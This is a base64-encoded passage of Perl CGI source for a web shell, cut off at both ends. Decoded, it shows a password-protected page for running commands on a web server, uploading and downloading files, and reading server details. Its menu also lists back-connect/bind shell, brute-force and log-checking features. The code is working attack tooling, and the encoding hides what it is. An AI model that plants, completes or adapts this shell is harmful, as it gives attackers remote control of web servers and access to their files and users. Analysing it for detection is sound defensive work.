hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mz4NCgkJPGI+PGZvbnQgc2l6ZT0iMyI+by0tLVsgICRFZGl0UGVyc2lvbiBdLS0tbzwvZm9udD48L2I+DQoJPC90ZD4NCgk8dGQ+DQoJCSRpbmZvDQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjZmY5OTAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iI2ZmOTkwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4NCgk8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZUN1cnJlbnREaXIiPkdVSTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZUN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiPg0KJGlkDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8Zm9udCBpZD0iUmVzcG9uc2VEYXRhIiBjb2xvcj0iI0ZGRkZGRiIgPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoYXIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBlbmNvZGUgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXJsRW5jb2RlKCQpew0KCW15ICRzdHIgPSBzaGlmdDsNCgkkc3RyID1+IHMvKFteQS1aYS16MC05XSkvc3ByaW50ZigiJSUlMDJYIiwgb3JkKCQxKSkvc2VnOw0KCXJldHVybiAkc3RyOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsNCglteSAkdGV4dCA9IHNoaWZ0Ow0KCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOw0KCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsNCgkkdGV4dCA9fiBzLycvJy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii5lbmNvZGVfYmFzZTY0KCRwYXRoKS4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snJ30NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBjb21tYW5kcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIjxmb250IGNvbG9yPScjRkZGRkZGJz5bYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQ8L2ZvbnQ+ICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiIgb25TdWJtaXQ9IkVuY29kZXIoJ2MnKSI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI0MCIgbmFtZT0iYyIgaWQ9ImMiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4NCjwvZm9ybT4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCkRvd25sb2FkOiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KDQo8L2Zvcm0+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byB1cGxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVVcGxvYWRGb3JtDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgaWQ9InVwIiB2YWx1ZT0ib3ZlcndyaXRlIj4NCjxsYWJlbCBmb3I9InVwIj5PdmVyd3JpdGUgaWYgaXQgRXhpc3RzPC9sYWJlbD48YnI+PGJyPg0KVXBsb2FkOiZuYnNwOyZu